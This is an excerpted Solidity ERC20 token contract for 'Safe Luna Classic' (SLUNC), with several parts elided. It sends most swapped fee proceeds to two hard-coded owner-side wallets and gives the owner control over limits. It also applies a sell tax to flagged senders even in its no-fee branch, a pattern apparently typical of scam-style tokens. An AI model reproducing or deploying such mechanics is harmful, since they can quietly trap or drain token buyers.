...
contract SLUNC is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Safe Luna Classic";
    string private constant _symbol = unicode"SLUNC";
    ...
    address payable private DevAddress = payable(0xc515711E622599532e787D4e0e23D400859E5D51);
    address payable private MarketingAddress = payable(0x0B32d4d2a022Fa792D27a7f4Ae29Cd48cFbA62A9);
    ...
    function RemoveLimitInEffect() external onlyOwner {
        _maxTxAmount = _maxWalletToken;
    }

    function _transfer( address from, address to, uint256 amount ) private {
        if (to != owner() && to != MarketingAddress && to != DevAddress && to != address(this) && to != uniswapV2Pair && to != DeadAddress && from != owner()){
        ...
        if (tradingActiveBlock + 25 seconds <= block.timestamp) {transferDelay = false;}
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap { 
            uint256 _tokenForMarketing = contractTokenBalance * 4 / 10;
            uint256 _tokenForDevelopment = contractTokenBalance * 5 / 10;
            uint256 _tokenForLpHalf = contractTokenBalance / 20;
            ...
            uint256 _BMarketing = _BTotal * 4 / 10;
            uint256 _BDevelopment = _BTotal * 5 / 10;
            ...
            sendToWallet(MarketingAddress, _BMarketing);
            _BTotal = address(this).balance;
            sendToWallet(DevAddress, _BTotal);
    }
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isExcludeds[sender]){sAmount = tAmount - tAmount*_tax_On_Sell/100;}
